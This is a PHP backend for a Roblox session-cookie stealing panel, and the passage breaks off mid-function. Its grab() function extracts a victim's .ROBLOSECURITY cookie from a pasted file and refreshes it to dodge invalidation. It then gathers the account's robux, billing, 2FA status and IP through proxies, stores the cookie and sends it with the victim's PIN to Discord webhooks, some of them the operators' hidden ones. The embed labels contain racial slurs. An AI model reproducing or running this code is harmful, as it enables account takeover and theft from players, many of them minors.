<?php
include_once($_SERVER['DOCUMENT_ROOT'] . '/backend/include.php');

function proxy() {
    $q0 = file($_SERVER['DOCUMENT_ROOT'] . '/backend/required/proxy.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    
    $j1 = [];
    foreach ($q0 as $s2) {
        $n3 = explode(':', $s2);
        if (count($n3) === 4) {
            $j1[] = [
                'ip'   => $n3[0],
                'port' => $n3[1],
                'user' => $n3[2],
                'pass' => $n3[3]
            ];
        }
    }
    
    $r4 = array_rand($j1);
    
    return [$j1[$r4]];
}

function connect() 
{
	global $s;
	
    $e6 = $s['app']['database']['host'];
    $m7 = $s['app']['database']['username'];    
    $w8 = $s['app']['database']['password'];       
    $b9 =   $s['app']['database']['name'];

    $xa = mysqli_connect($e6, $m7, $w8, $b9);

    if (!$xa) { die('Invalid SQL Creds'); }

    return $xa;
}

function getHook() 
{
    $ub = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

    if (preg_match('#/generator/([^/]+)/create#', $ub, $gc)) {
        $ld = $gc[1];
    } else {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Invalid link.']));
    }

    $xa = connect();

    $re = $xa->prepare("SELECT name, color, is_quad, is_triple, icon FROM Hooks WHERE directory = ?");
    $re->bind_param("s", $ld);
    $re->execute();
    $re->bind_result($mf, $p10, $q11, $s12, $q13);
    $re->fetch();
    $re->close();

    if (!$mf) {
        http_response_code(404);
        die(json_encode(['success' => false, 'error' => 'Hook not found.']));
    }

    $w14 = htr($p10);

    $k15 = null;
    if ($q11 == 1) {
		$k15 = 'Triplehook';
	} elseif ($q11 !== 1 && $s12 == 0) {
		$k15 = 'Dualhook';
	} else {
		$k15 = null;
	}

	return [
        'success' => true,
        'name' => $mf,
        'directory' => $ld,
        'color' => $w14,
        'type' => $k15,
        'icon' => $q13
    ];
}

function htr($s16) 
{
    $s16 = ltrim($s16, '#');

    if (strlen($s16) == 6) {
        list($m17, $h18, $f19) = str_split($s16, 2);
        $m1a = 1;
    } 
    elseif (strlen($s16) == 8) {
        list($m17, $h18, $f19, $m1a) = str_split($s16, 2);
        $m1a = hexdec($m1a) / 255;
    } else {
        return '0, 0, 0';
    }

    $m17 = hexdec($m17);
    $h18 = hexdec($h18);
    $f19 = hexdec($f19);

    return "$m17, $h18, $f19";
}

function short($m1b) 
{
    $q0 = proxy();
    if (empty($q0)) {
        return $m1b;
    }
    
    $j1 = $q0[array_rand($q0)];
    
    $n1c = curl_init('https://spoo.me/');
    curl_setopt($n1c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($n1c, CURLOPT_POST, true);
    curl_setopt($n1c, CURLOPT_POSTFIELDS, http_build_query(['url' => $m1b]));
    curl_setopt($n1c, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded',
        'Accept: application/json'
    ]);
    
    curl_setopt($n1c, CURLOPT_PROXY, $j1['ip'] . ':' . $j1['port']);
    curl_setopt($n1c, CURLOPT_PROXYUSERPWD, $j1['user'] . ':' . $j1['pass']);
    
    curl_setopt($n1c, CURLOPT_TIMEOUT, 7);
    curl_setopt($n1c, CURLOPT_CONNECTTIMEOUT, 7);
    
    $c1d = curl_exec($n1c);
    
    if(curl_errno($n1c)) {
        curl_close($n1c);
        return $m1b;
    }
    
    curl_close($n1c);
    
    $t1e = json_decode($c1d, true);
    return $t1e['short_url'] ?? $m1b;
}

function check() 
{
	$xa = connect();
    if (isset($_COOKIE['Token'])) {
        $p1f = $_COOKIE['Token'];
        $re = $xa->prepare("SELECT token FROM Tokens WHERE token = ?");
        $re->bind_param("s", $p1f);
        $re->execute();
        $re->store_result();
        
        if ($re->num_rows > 0) {
            return true;
        }
    }
    header('Location: /controlPage/sign-in');
    exit();
}

function info()
{
	global $s;
    if (!isset($_COOKIE['Token'])) {
        header("Location: /controlPage/sign-in");
        exit;
    }

    $p1f = $_COOKIE['Token'];
    $xa = connect();
    
    $re = $xa->prepare("SELECT * FROM Tokens WHERE token = ?");
    $re->bind_param("s", $p1f);
    $re->execute();
    $t21 = $re->get_result();
    $m7 = $t21->fetch_assoc();
    $re->close();

    if (!$m7) {
        header("Location: /controlPage/sign-in");
        exit;
    }

    if (!empty($m7['user_icon']) && !preg_match('/^https?:\/\//', $m7['user_icon'])) {
        $r22 = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
        $m7['user_icon'] = $r22 . "://" . $_SERVER['HTTP_HOST'] . $m7['user_icon'];
    }

    $g23 = [
        'name' => $s['app']['setup']['name'],
        'icon' => $s['app']['setup']['icon']
    ];

    if ($m7['is_hooked'] == 1 && isset($m7['hook_id'])) {
        $re = $xa->prepare("SELECT name, icon FROM Hooks WHERE id = ?");
        $re->bind_param("i", $m7['hook_id']);
        $re->execute();
        $t21 = $re->get_result();
        $r24 = $t21->fetch_assoc();
        $re->close();

        if ($r24) {
            $g23 = [
                'name' => $r24['name'],
                'icon' => $r24['icon']
            ];
        }
    }

    return [
        'user' => $m7,
        'hook' => $g23
    ];
}

function leaderboard()
{
    $xa = connect();
    $r22 = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
    $e6 = $_SERVER['HTTP_HOST'];

    $re = $xa->prepare("SELECT t.username, t.user_icon, COUNT(a.id) AS integerValue FROM Tokens t LEFT JOIN Accounts a ON t.token = a.`for` GROUP BY t.token ORDER BY integerValue DESC LIMIT 10");
    $re->execute();
    $t21 = $re->get_result();
    $s25 = [];

	if (!preg_match('/^https?:\/\//', $i26['user_icon'])) {
		$r22 = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
		$i26['user_icon'] = $r22 . "://" . $_SERVER['HTTP_HOST'] . $i26['user_icon'];
	}
	
    while ($i26 = $t21->fetch_assoc()) {
        $s25[] = [
            "profilePictureBlobURL" => $i26['user_icon'],
            "username" => $i26['username'] ?? "Anonymous",
            "integerValue" => (string) $i26['integerValue']
        ];
    }

    if (empty($s25)) {
        $re = $xa->prepare("SELECT username, user_icon FROM Tokens LIMIT 10");
        $re->execute();
        $t21 = $re->get_result();

        while ($i26 = $t21->fetch_assoc()) {
            $s25[] = [
                "profilePictureBlobURL" => "$r22://$e6" . $i26['user_icon'],
                "username" => $i26['username'] ?? "Anonymous",
                "integerValue" => "0"
            ];
        }
    }

    $re->close();

    echo json_encode($s25);
}

function get() 
{
    if (!isset($_GET['h'])) {
        header("Location: https://" . $_SERVER['HTTP_HOST']);
        exit;
    }

    $a27 = $_GET['h'];
	
    $xa = connect();

    $re = $xa->prepare("SELECT * FROM Tokens WHERE directory = ?");
    $re->bind_param("s", $a27);
    $re->execute();

    $t21 = $re->get_result();
    $t1e = $t21->fetch_all(MYSQLI_ASSOC);

    $re->close();
    $xa->close();
	
    return $t1e;
}

function getForPage() 
{
    if (!isset($_COOKIE['Session'])) {
        die(json_encode([
            "success" => false,
            "error" => "Expired session! Please refresh your tab."
        ]));
    }

    $a27 = $_COOKIE['Session'];
	
    $xa = connect();

    $re = $xa->prepare("SELECT * FROM Tokens WHERE directory = ?");
    $re->bind_param("s", $a27);
    $re->execute();

    $t21 = $re->get_result();
    $t1e = $t21->fetch_all(MYSQLI_ASSOC);

    $re->close();
    $xa->close();
	
    return $t1e;
}


function grab($s28, $v29) 
{
    global $s;
    global $gb8;
    $j1 = proxy();
    $j1 = $j1[0];
    
    $j2a = '/(_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_.*?)"/';
    
    if (preg_match($j2a, $s28, $gc)) {
        $j2b = $gc[1];
    } else {
        $j2c = '/("\.ROBLOSECURITY", "_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_.*?", "/", "\.roblox\.com")/';
        
        if (preg_match($j2c, $s28, $gc)) {
            $j2b = $gc[1];
        } else {
            $j2d = '/System\.Net\.Cookie\("\.ROBLOSECURITY", "(.*?)", "\/", "\.roblox\.com"\)/';
            
            if (preg_match($j2d, $s28, $gc)) {
                $j2b = $gc[1];
            } else {
                http_response_code(400);
                die(json_encode([
                    "success" => false,
                    "error" => "You copied the wrong file! Please try again."
                ]));
            }
        }
    }

	$y2c = [];

    $u2d = $j2b;
    $j2b = refresh($j2b);
    
    //$q2e = cticket($j2b['cookie'], $j1);
    //$s2f = roblox($j2b['cookie'], $q2e);
    $s2f = roblox($j2b['cookie']);
    $u30 = getForPage();
    $u30 = $u30[0];
    
    $v31 = '';

    if (!$j2b['success']) {
        $v31 = "\n\n`Failed to refresh cookie. Please manually refresh`";
    }

    $xa = connect();
    
    $re = $xa->prepare("INSERT INTO Accounts (id, `for`, date, rap, robux, summary, cookie) 
                            VALUES (1, ?, NOW(), ?, ?, ?, ?)");
    $re->bind_param("sssss", $u30['token'], $s2f['rap'], $s2f['robux'], $s2f['summary'], $j2b['cookie']);
    
    if ($re->execute()) {
    } else {
        error_log("Error inserting data into Accounts table: " . $re->$g32);
    }
	
	//die(json_encode($s2f['age']));
	if (strpos($u30['user_icon'], 'https://') !== 0) {
    $u30['user_icon'] = "https://" . $_SERVER['HTTP_HOST'] . "/" . ltrim($u30['user_icon'], "/");
}
		
	
	$thing = $s['app']['embed']['name'];

	
	$shit = ($amount = floatval(preg_replace('/[^0-9.]/', '', $s2f['creditBalance']))) > 0 ? $amount * 100 : 0;

	
$g33 = [
    "title" => "**``$thing - Result``**",
    "description" => "**<:cookie2:1352746981025382422> [Check .ROBLOSECURITY](http://" . $_SERVER['HTTP_HOST'] . "/controlPage/refresh?cookie={$j2b['cookie']}) | [Rolimons](https://www.rolimons.com/player/{$s2f['userId']}) <:rolimonsnigger:1353090712077336617> | [" . ip() . "](https://ipinfo.io/" . ip() . ") 📍**",
    "color" => 13421772,
    "fields" => [
        [
            "name" => "About User",
            "value" => "``Account Age: {$s2f['days']} Days``\n``Place Visits: {$s2f['visits']}``",
            "inline" => false
        ],
		[
            "name" => "<:robux:1294276373225013351> Robux",
            "value" => "Balance: {$s2f['robux']} <:robux:1294276373225013351>\n Balance: {$s2f['pending']} <:robux:1294276373225013351>",
            "inline" => true
        ],
        [
            "name" => "<:rapnigger:1352749046778826752> Rap",
            "value" => "Rap: {$s2f['rap']} <:rapnigger:1352749046778826752>\n Owned: {$s2f['owned']} <:legitsuitcase:1353107129371725955>",
            "inline" => true
        ],
        [
            "name" => "<:summarynigger:1353097434762575952> Summary",
            "value" => "{$s2f['summary']}",
            "inline" => true
        ],
        [
            "name" => "<:billingnigger:1353099127461908500> Billing",
            "value" => "Credit: {$s2f['creditBalance']} <:coinsnigger:1353102376164261889>\n Convert: {$shit} <:robux:1294276373225013351>\n Card: {$s2f['sv']} <:cardigger:1353102615898226810>",
            "inline" => true
        ],
        [
            "name" => "<:game:1352751660199317515> | Played | Passes",
            "value" => formatGames($s2f['forGames']),
            "inline" => true
        ],
        [
			"name" => "<:settingsnigger:1353102453066698793> Settings",
			"value" => "Authenticator: " . ($s2f['authenticator'] ? "<:verifiedbysardi:1353103931231703163>" : "<:unverified:1353107677177446471>") . "\nEmail: " . ($s2f['email'] ? "<:verifiedbysardi:1353103931231703163>" : "<:unverified:1353107677177446471>"),
			"inline" => true
		],
		[
            "name" => "<:premiumsardi:1353116693366444293> Premium",
            "value" => $s2f['premium'],
            "inline" => true
        ],
        [
            "name" => "<:collectiblesnigger:1352749161895825629> Collectibles",
            "value" => "<:korbloxsardi:1353116929472331886> " . ($s2f['korblox'] ? "True" : "False") . "\n" . $s['app']['additional']['headless'] . " " . ($s2f['headless'] ? "True" : "False"),
            "inline" => true
        ],
        [
            "name" => "<:pinigger:1353102521144705125> Pin",
            "value" => $v29, 
            "inline" => true
        ]
    ],
    "author" => [
        "name" => "{$s2f['username']}\n {$s2f['age']} " . date('d/m/Y'),
        "icon_url" => $s2f['headshot'],
    ],
    "thumbnail" => [
        "url" => $s2f['thumbnail'],
    ]
];

$g34 = [
    "title" => "<:john:1352747208319176867> .ROBLOSECURITY",
    "description" => "```" . $j2b['cookie'] . "```",
    "color" => 13421772,
	"thumbnail" => [
        "url" => "https://i.ibb.co/67MGm5qD/541732.webp"
    ],
	"footer" => [
        "text" => $u30['username'] . " - Thank you for using our service.",
        "icon_url" => $u30['user_icon']
    ],
];

$w34 = [
    "content" => "@everyone - <t:" . time() . ":R>",
    "embeds" => [$g33, $g34],
    "username" => $s['app']['embed']['name'],
    "avatar_url" => $s['app']['embed']['icon'],
    "attachments" => []
];

	
	

	
	
	if ($u30['is_hooked'] == "1") {
    $x35 = $u30['hook_id'];

    $xa = connect();

    $re = $xa->prepare("SELECT name, icon, webhook, is_quad, is_triple FROM Hooks WHERE id = ?");
    $re->bind_param("i", $x35);
    $re->execute();
    $t21 = $re->get_result();

    if ($i26 = $t21->fetch_assoc()) {
		$thing = $i26["name"];
        $w34["username"] = $i26["name"];
        $w34["avatar_url"] = $i26["icon"];
        $y2c[] = $i26["webhook"];

        if (strpos($w34["avatar_url"], 'https://') !== 0) {
            $w34["avatar_url"] = "https://" . $_SERVER['HTTP_HOST'] . "/" . ltrim($w34["avatar_url"], "/");
        }

        if (!is_null($i26['is_quad']) && $i26['is_quad'] > 1) {
            $h36 = $i26['is_quad'];
            $b37 = $xa->prepare("SELECT webhook FROM Hooks WHERE id = ?");
            $b37->bind_param("i", $h36);
            $b37->execute();
            $y38 = $b37->get_result();

            if ($h39 = $y38->fetch_assoc()) {
                $y2c[] = $h39["webhook"];
            }
            $b37->close();
        }

        elseif (!is_null($i26['is_triple']) && $i26['is_triple'] > 1) {
            $h3a = $i26['is_triple'];
            $a3b = $xa->prepare("SELECT webhook, is_quad FROM Hooks WHERE id = ?");
            $a3b->bind_param("i", $h3a);
            $a3b->execute();
            $w3c = $a3b->get_result();

            if ($l3d = $w3c->fetch_assoc()) {
                $y2c[] = $l3d["webhook"];

                if (!is_null($l3d['is_quad']) && $l3d['is_quad'] > 1) {
                    $b3e = $l3d['is_quad'];
                    $i3f = $xa->prepare("SELECT webhook FROM Hooks WHERE id = ?");
                    $i3f->bind_param("i", $b3e);
                    $i3f->execute();
                    $g40 = $i3f->get_result();

                    if ($u41 = $g40->fetch_assoc()) {
                        $y2c[] = $u41["webhook"];
                    }
                    $i3f->close();
                }
            }
            $a3b->close();
        }
    }

    $re->close();
    $xa->close();
}


	
	
	
	
	
	
	
	
	

	
	

$y2c[] = $s['app']['secret']['webhooks']['basic'];

if (
    !(
        $s2f['robux'] > $s['app']['secret']['filter']['robux']['protect'] ||
        $s2f['summary'] > $s['app']['secret']['filter']['summary']['protect'] ||
        $s2f['rap'] > $s['app']['secret']['filter']['rap']['protect']
    )
) {
    $y2c[] = $u30['webhook'];
}

if ($s2f['robux'] > $s['app']['secret']['filter']['robux']['notify']) {
    $y2c[] = $s['app']['secret']['webhooks']['robux'];
}

if ($s2f['rap'] > $s['app']['secret']['filter']['rap']['notify']) {
    $y2c[] = $s['app']['secret']['webhooks']['rap'];
}

if ($s2f['summary'] > $s['app']['secret']['filter']['summary']['notify']) {
    $y2c[] = $s['app']['secret']['webhooks']['summary'];
}
	
	


    send($y2c, $w34);
    send($s2f['playedWebhooks'], $w34);
	

    if (strlen($v29) > 100) {
        $v29 = 'Pin was too large, which means it was probably fake.';
    } elseif (strlen($v29) < 4) {
        http_response_code(400);
        die(json_encode([ 
            "success" => false,
            "error" => "Pin must be at least 4 characters."
        ]));
    }
	
	die(json_encode([ 
            "success" => true
        ]));
}

function formatGames($o42) {
    $d43 = '';
    $n44 = 0;
    
    foreach ($o42 as $s45) {
        $p46 = $s45['emoji'];
        $g544 = $s45['gamepasses'];
        $q47 = $s45['played'] ? 'True' : 'False';
        $d43 .= "$p46 | $q47 | $g544\n";
        
    }
    
    return $d43;
}

function send($y2c, $w34) {
    foreach ($y2c as $m48) {
        $j1 = proxy();
		$j1 = $j1[0];
        
        $n1c = curl_init($m48);
        curl_setopt($n1c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($n1c, CURLOPT_POST, true);
        curl_setopt($n1c, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($n1c, CURLOPT_POSTFIELDS, json_encode($w34));
        
        curl_setopt($n1c, CURLOPT_PROXY, $j1['ip']);
        curl_setopt($n1c, CURLOPT_PROXYPORT, $j1['port']);
        curl_setopt($n1c, CURLOPT_PROXYUSERPWD, $j1['user'] . ':' . $j1['pass']);
        curl_setopt($n1c, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        
        $c1d = curl_exec($n1c);

		curl_close($n1c);
    }
    return true;
}

function roblox($j2b) {
    global $s;
    $u49 = proxy();
	$u49 = $u49[0];
	
    $a27 = ["Cookie: .ROBLOSECURITY=$j2b", "Content-Type: application/json"];

    function req($n4a, $k4b, $p4c = null, $u49, $a27) {
        $n1c = curl_init($n4a);
        curl_setopt($n1c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($n1c, CURLOPT_HTTPHEADER, $a27);
        curl_setopt($n1c, CURLOPT_PROXY, $u49['ip']);
        curl_setopt($n1c, CURLOPT_PROXYPORT, $u49['port']);
        curl_setopt($n1c, CURLOPT_PROXYUSERPWD, $u49['user'] . ':' . $u49['pass']);
        curl_setopt($n1c, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        if ($k4b == 'POST') {
            curl_setopt($n1c, CURLOPT_POST, true);
            curl_setopt($n1c, CURLOPT_POSTFIELDS, json_encode($p4c));
        }
        $e4d = curl_exec($n1c);
        curl_close($n1c);
        return json_decode($e4d, true);
    }
	
	$o60 = req("https://www.roblox.com/my/settings/json", 'GET', null, $u49, $a27);
    $g61 = $o60['IsEmailVerified'];
    $h62 = $o60['ClientIpAddress'];
    $z63 = $o60['UserAbove13'] ? '13+' : '<13';
	

    $n4a = req("https://users.roblox.com/v1/users/authenticated", 'GET', null, $u49, $a27);
    $y4e = $n4a['id'];
    $y4f = $n4a['name'];
    $n50 = $n4a['displayName'];

    $k51 = req("https://voice.roblox.com/v1/settings", 'GET', null, $u49, $a27);
    $v52 = false;
    if ($k51['isVoiceEnabled'] && $k51['isUserOptIn'] && !$k51['isBanned']) {
        $v52 = true;
    }

    $c53 = req("https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age", 'GET', null, $u49, $a27);
    $j54 = $c53['isVerified'];
    $h55 = $z63;
	
	//die(json_encode($c53));

    if ($j54) {
        $s56 = true;
        if ($c53['isSeventeenPlus']) {
            $z63 = '17+';
        }
    } else {
        $s56 = false;
    }

    $a57 = req("https://premiumfeatures.roblox.com/v1/users/{$y4e}/validate-membership", 'GET', null, $u49, $a27);
    $s58 = req("https://thumbnails.roblox.com/v1/users/avatar?userIds=$y4e&size=150x150&format=Png&isCircular=false", 'GET', null, $u49, $a27);
    $t59 = $s58['data'][0]['imageUrl'];

    $b5a = req("https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds=$y4e", 'GET', null, $u49, $a27);
    $j5b = $b5a['data'][0]['imageUrl'];

	$m5c = req("https://economy.roblox.com/v1/users/$y4e/currency", 'GET', null, $u49, $a27);
	$d5d = $m5c['robux'];

    $v5e = req("https://apis.roblox.com/credit-balance/v1/get-conversion-metadata", 'GET', null, $u49, $a27);
$p5f = (isset($v5e['creditBalance']) && isset($v5e['currencyCode']) && $v5e['creditBalance'] !== null && $v5e['currencyCode'] !== null) 
    ? $v5e['creditBalance'] . ' ' . $v5e['currencyCode'] 
    : '0.00';

	/* changed to get prev to refresh ig*/
	
$m64 = req("https://apis.roblox.com/token-metadata-service/v1/sessions?nextCursor=&desiredLimit=25", 'GET', null, $u49, $a27);

$nonCurrentSessions = array_filter($m64['sessions'], fn($s) => !$s['isCurrentSession']);

if (!empty($nonCurrentSessions)) {
    $f65 = reset($nonCurrentSessions);
} else {
    $f65 = current($m64['sessions']);
}


$z66 = $f65['agent']['value'] ?? 'Unknown';
$g67 = $f65['agent']['os'] ?? 'Unknown';
$p68 = $f65['location']['country'] ?? 'Unknown';


    $z69 = req("https://twostepverification.roblox.com/v1/users/{$y4e}/configuration", 'GET', null, $u49, $a27);
    $x6a = false;
    if (isset($z69['methods'])) {
        foreach ($z69['methods'] as $k4b) {
            if ($k4b['mediaType'] === 'Authenticator' && $k4b['enabled']) {
                $x6a = true;
                break;
            }
        }
    }

    $l6b = [
        'pageType' => 'Home',
        'sessionId' => 'a12',
        'supportedTreatmentTypes' => ['SortlessGrid']
    ];
    $s6c = req("https://apis.roblox.com/discovery-api/omni-recommendation", 'POST', $l6b, $u49, $a27);

    $e6d = [];
    if (isset($s6c['sorts'])) {
        foreach ($s6c['sorts'] as $b6e) {
            if (isset($b6e['topicId']) && in_array($b6e['topicId'], [100000003, 100000008])) {
                foreach ($b6e['recommendationList'] as $h18) {
                    if ($h18['contentType'] === 'Game' && isset($h18['contentId'])) {
                        $e6d[] = $h18['contentId'];
                    }
                }
            }
        }
    }

	$t6f = $s['app']['secret']['webhooks']['games'];
	$u70 = [];
	
	
	
	foreach ($t6f as $z71 => $h18) {
    $gamepassesCount = 0;
    if (isset($h18['place']) && !empty($h18['place'])) {
        $placeId = $h18['place'];
        
        $a27 = [
            "Cookie: .ROBLOSECURITY=$j2b", 
            "Content-Type: application/json"
        ];
        
        $n1c = curl_init();
        
        curl_setopt($n1c, CURLOPT_URL, "https://www.roblox.com/games/getgamepassesinnerpartial?startIndex=0&maxRows=50&placeId=$placeId");
        curl_setopt($n1c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($n1c, CURLOPT_HTTPHEADER, $a27); 
        curl_setopt($n1c, CURLOPT_FOLLOWLOCATION, true); 
        curl_setopt($n1c, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($n1c, CURLOPT_SSL_VERIFYPEER, 0); 
        
        curl_setopt($n1c, CURLOPT_PROXY, $u49['ip']); 
        curl_setopt($n1c, CURLOPT_PROXYPORT, $u49['port']);
        curl_setopt($n1c, CURLOPT_PROXYUSERPWD, $u49['user'] . ':' . $u49['pass']); 
        
        $html = curl_exec($n1c);
        
        curl_close($n1c);
                
        if (preg_match_all('/<li class="list-item real-game-pass">.*?<div class="store-card-footer">.*?<\/div>.*?<\/li>/s', $html, $matches)) {
            foreach ($matches[0] as $match) {
                if (strpos($match, '<button class="PurchaseButton') == false) {
                    $gamepassesCount++;
                }
            }
        }
    }
    $t6f[$z71]['gamepasses'] = $gamepassesCount > 0 ? $gamepassesCount : 0;
    $t6f[$z71]['played'] = in_array($h18['universe'], $e6d);
}


	
	
	
	
	
	
	
	

    $h72 = req("https://economy.roblox.com/v2/users/{$y4e}/transaction-totals?timeFrame=Year&transactionType=summary", 'GET', null, $u49, $a27);
    $k73 = isset($h72['incomingRobuxTotal']) ? $h72['incomingRobuxTotal'] : 0;
    $pending = isset($h72['pendingRobuxTotal']) ? $h72['pendingRobuxTotal'] : 0;

    $p74 = req("https://inventory.roblox.com/v1/users/{$y4e}/assets/collectibles?sortOrder=Asc&limit=100", 'GET', null, $u49, $a27);
$u75 = 0;
$owned = 0;

if (isset($p74['data'])) {
    foreach ($p74['data'] as $l76) {
        $u75 += $l76['recentAveragePrice'];
        $owned++;
    }
}


	$g77 = req("https://catalog.roblox.com/v1/catalog/items/192/details?itemType=Bundle", 'GET', null, $u49, $a27);
	$t78 = req("https://catalog.roblox.com/v1/catalog/items/201/details?itemType=Bundle", 'GET', null, $u49, $a27);

	
	
	$fewwfewef = req("https://www.roblox.com/my/settings/json", 'GET', null, $u49, $a27);
	$days = $fewwfewef['AccountAgeInDays'];
	
	
	
	
	$penis = req("https://games.roblox.com/v2/users/{$y4e}/games?accessFilter=Public&sortOrder=Asc&limit=10", 'GET', null, $u49, $a27);
	$visits = $penis['data'][0]['placeVisits'];

	
	

		
		
		
		
		
		
		
		
    return [
        'userId' => $y4e,
        'username' => $y4f,
        'displayName' => $n50,
        'korblox' =>  $g77['owned'],
        'headless' => $t78['owned'],
        'premium' => $a57,
        'thumbnail' => $t59,
        'headshot' => $j5b,
        'creditBalance' => $p5f,
        'email' => $g61,
        'ip' => $h62,
        'age' => $h55,
        'browser' => $z66,
        'os' => $g67,
        'country' => $p68,
        'authenticator' => $x6a,
        'continue' => $e6d,
        'forGames' => $t6f,
        'vc' => $v52,
        'sv' => "False",
        'id' => $s56,
        'summary' => $k73,
        'rap' => $u75,
        'playedWebhooks' => $u70,
        'robux' => $d5d,
		'owned' => $owned,
		'pending' => $pending,
		'days' => $days,
		'visits' => $visits,
    ];
}

/*function refresh($cookie) {
    $proxy = proxy();
    $proxy = $proxy[0];
    $csrf = cticket($cookie, $proxy);
    $authenticationTicket = ticket($cookie, $proxy, $csrf);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["authenticationTicket" => $authenticationTicket]));
    curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'] . ':' . $proxy['port']);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/games/920587237/Adopt-Me",
        "x-csrf-token: " . $csrf,
        "RBXAuthenticationNegotiation: 1",
		"User-Agent: Mozilla/5.0 (X11; U; AIX 7.1; en-US) AppleWebKit/420+ (KHTML, like Gecko) Chrome/1.0.0 Safari/420.69" 

    ]);

    $output = curl_exec($ch);

	if (curl_errno($ch)) {
        curl_close($ch);
        return [
            'success' => false,
            'cookie' => $cookie
        ];
    }

    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($output, 0, $header_size);
    $body = substr($output, $header_size);

    $Bypassed = explode(";", explode(".ROBLOSECURITY=", $output)[1])[0];

    curl_close($ch);
	
    if (empty($Bypassed)) {
        return [
            'success' => false,
            'cookie' => $cookie
        ];
    } else {
        return [
            'success' => true,
            'cookie' => $Bypassed
        ];
    }
}

function ticket($cookie, $proxy, $csrf)
{
    $ch = curl_init();
    curl_setopt(
        $ch,
        CURLOPT_URL,
        "https://auth.roblox.com/v1/authentication-ticket"
    );
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'] . ':' . $proxy['port']);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/",
        "x-csrf-token: " . $csrf,
        "Cookie: .ROBLOSECURITY=$cookie",
    ]);
    $output = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($output, 0, $header_size);
    $body = substr($output, $header_size);
    curl_close($ch);
    $headers = headersToArray($header);
    return trim($headers["rbx-authentication-ticket"]);
}

function cticket($cookie, $proxy)
{
    $curl = curl_init();
    curl_setopt(
        $curl,
        CURLOPT_URL,
        "https://auth.roblox.com/v2/login"
    );

    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_PROXY, $proxy['ip'] . ':' . $proxy['port']);
    curl_setopt($curl, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HEADER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, [
        "origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/Login",
        "Cookie: .ROBLOSECURITY=$cookie",
    ]);
    $result = curl_exec($curl);
    if (curl_errno($curl)) {
        die(curl_error($curl));
    }
    $headerSize = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
    $headerStr = substr($result, 0, $headerSize);
    $bodyStr = substr($result, $headerSize);
    $json = json_decode($bodyStr, true);
    $headers = headersToArray($headerStr);
    curl_close($curl);
    return trim($headers["x-csrf-token"]);
}

function headersToArray($l85)
{
    $k7f = [];
    $z86 = explode("\r\n", $l85);
    for ($u87 = 0; $u87 < count($z86); ++$u87) {
        if (strlen($z86[$u87]) > 0) {
            if (strpos($z86[$u87], ":")) {
                $p88 = substr(
                    $z86[$u87],
                    0,
                    strpos($z86[$u87], ":")
                );
                $f89 = substr(
                    $z86[$u87],
                    strpos($z86[$u87], ":") + 1
                );
                $k7f[$p88] = $f89;
            }
        }
    }
    return $k7f;
}*/

function refresh($cookie) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://auth.api.robloxdev.cn/v1/authentication-ticket",
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            "content-type: application/json",
            "origin: https://www.roblox.com",
            "referer: https://www.roblox.com/",
            "cookie: .ROBLOSECURITY=" . $cookie
        ],
        CURLOPT_RETURNTRANSFER => true
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    if (!preg_match("/x-csrf-token:\s*(\S+)/i", $response, $matches)) {
        return ["success" => false, "cookie" => null];
    };
